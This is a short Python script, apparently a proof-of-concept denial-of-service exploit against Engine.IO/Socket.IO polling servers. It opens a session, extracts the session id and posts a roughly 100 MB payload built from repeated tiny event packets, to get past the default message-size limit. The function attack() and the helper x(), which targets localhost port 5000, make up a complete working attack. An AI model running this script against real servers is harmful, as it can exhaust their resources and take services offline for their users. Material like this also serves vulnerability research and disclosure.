import re
import time

import requests


def make_payload(total_length, data_length=2):
    # 4 means MESSAGE in engineio (data[0])
    # 2 means EVENT (non-binary) in socketio (data[1])
    # data_length : data
    # e.g. '40:42["my event",{"data":"I\'m connected!"}]' * 20
    prefix = '42'
    assert data_length >= len(prefix)
    packet = '%d:%s' % (data_length, prefix + 'x' * (data_length - len(prefix)))
    repetitions = total_length // len(packet)
    return packet * repetitions


def timestr():
    return "&t=" + str(time.time())


def attack(host, payload_length=100000000):
    # engineio default max length is 10 meg
    base_url = host + "/socket.io/?EIO=3&transport=polling"
    # Create session
    response = requests.get(base_url + timestr()).text
    print(response)
    sid = re.search("\"sid\":\"([a-f0-9]+)\"", response).group(1)
    session_url = base_url + "&sid=" + sid
    # Fire payload
    payload = make_payload(payload_length)
    print(payload[:100], len(payload))
    return requests.post(
        session_url + timestr(),
        data=payload,
        headers={'Content-Type': 'text/plain'},
    ).text


def x(payload_length=100000000):
    return attack("http://127.0.0.1:5000", payload_length)
